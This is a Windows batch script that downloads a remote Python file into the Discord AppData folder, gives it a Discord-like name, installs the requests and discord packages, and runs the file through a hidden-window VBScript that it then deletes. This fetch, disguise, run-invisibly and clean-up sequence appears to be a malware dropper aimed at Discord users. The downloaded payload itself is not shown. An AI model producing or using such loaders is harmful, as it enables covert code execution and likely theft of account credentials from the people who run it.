@echo off
REM Set the URL of the Python script to download
set URL=https://raw.githubusercontent.com/iiMAtEAs/bot/refs/heads/main/discord_api_packages.py

REM Set the destination directory and filename
set DEST=C:\Users\user\AppData\Roaming\discord\discord_api_packages.py

REM Check if the Python script already exists
if exist "%DEST%" (
    echo The script is already downloaded.
) else (
    REM Create the directory if it doesn't exist
    if not exist "C:\Users\user\AppData\Roaming\discord" mkdir "C:\Users\user\AppData\Roaming\discord"

    REM Download the file using PowerShell
    powershell -Command "Invoke-WebRequest -Uri %URL% -OutFile %DEST%"
    echo File downloaded successfully.
)

REM Ensure Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed. Exiting...
    pause
    exit /b
)

REM Ensure pip is installed and up to date
python -m ensurepip --upgrade >nul 2>&1
python -m pip install --upgrade pip >nul 2>&1

REM Check if the necessary packages are installed (requests and discord in this example)
python -c "import requests" >nul 2>&1
if %errorlevel% neq 0 (
    echo 'requests' package not found. Installing...
    python -m pip install requests
)

python -c "import discord" >nul 2>&1
if %errorlevel% neq 0 (
    echo 'discord' package not found. Installing...
    python -m pip install discord
)

REM Create a VBScript to run the Python script silently
echo Set WshShell = CreateObject("WScript.Shell") > run_hidden.vbs
echo WshShell.Run "python ""%DEST%""", 0, True >> run_hidden.vbs

REM Run the Python script in the background using the VBScript
cscript //nologo run_hidden.vbs

REM Clean up the VBScript file after execution
del run_hidden.vbs

pause
